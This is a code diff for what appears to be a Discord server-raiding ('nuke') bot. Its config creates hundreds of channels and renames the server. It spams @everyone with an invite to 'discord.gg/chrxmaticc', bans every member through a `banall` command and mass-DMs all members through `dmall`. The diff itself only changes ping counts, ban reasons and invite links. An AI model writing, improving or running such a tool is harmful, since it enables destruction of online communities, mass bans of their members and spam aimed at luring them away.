@@ -12,8 +12,8 @@ token = os.getenv("DISCORD_TOKEN")
 
 DEFAULT_CONFIG = {
     "channels": 500,
-    "channel-name": "cturnal",
-    "pings": 15,
+    "channel-name": "/chrxmaticc owns evb",
+    "pings": 30,
     "server-name": "moving to /chrxmaticc",
     "webhook-name": "disc",
     "message": "moving servers: https://discord.gg/chrxmaticc  @everyone"
@@ -165,7 +165,7 @@ async def banall(ctx):
     async def safe_ban(member):
         try:
             async with rate_limiter:
-                await guild.ban(member, reason="whoops bye bye")
+                await guild.ban(member, reason="whoops bye bye! go to discord.gg/chrxmaticc to join back!")
         except discord.HTTPException as e:
             if e.status == 429:
                 await asyncio.sleep(e.retry_after or 1)
@@ -182,7 +182,7 @@ async def banall(ctx):
 async def dmall(ctx):
     guild = ctx.guild
     dm_tasks = [
-        member.send(f"Hey {member.mention} the server named {guild.name} is moving servers to https://discord.gg/zk9HBPgwzT")
+        member.send(f"hy {member.mention} the server named {guild.name} is moving servers to https://discord.gg/chrxmaticc")
         for member in guild.members
         if not member.bot and member.id != ctx.author.id
     ]
